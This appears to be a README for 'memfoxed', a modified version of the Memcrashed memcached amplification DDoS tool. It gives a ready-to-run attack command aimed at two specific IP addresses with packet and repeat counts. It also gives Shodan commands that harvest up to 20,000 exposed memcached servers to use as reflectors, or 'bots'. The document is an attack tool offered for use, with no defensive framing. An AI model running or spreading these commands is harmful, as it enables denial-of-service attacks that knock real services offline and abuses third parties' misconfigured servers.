# MEMFOXED

`memfoxed` is a simplified script. Changes made:

* configuration options are passed using CLI args (rather than with interactive questions)
* supports multiple targets

Example:

```shell
$ sudo ./memfoxed.py \
    -t 109.207.14.3:53 \
    -t 193.164.146.24:23 \
    --num-packets 10 \
    --repeat 100 \
    --bots-config ./bots.txt
```

Note that `--bots-config` expects file with line-separated list of IP address of Memcached servers (e.g. see "Download Bots" section how to get one using Shodan API).

### Download Bots

To avoid slow (and rate limited) API calls to Shodan API, you can download all known memcached servers using `shodan` tool.

```shell
$ python3 -m pip install shodan
$ shodan init <KEY>
$ shodan download --limit 20000 bots.json.gz product:"Memcached" port:11211
$ gzip -d bots.json.gz
$ cat bots.json | jq '.ip_str' -r | grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}' > bots.txt 
```

When running `Memcrasched.py` make sure to reply "N" for using Shadon API.

### MEMCRASHED DDOS EXPLOIT TOOL INSTRUCTIONS AND INFO

* Author: [@037](https://twitter.com/037)
* [Link](https://github.com/649/Memcrashed-DDoS-Exploit#readme)
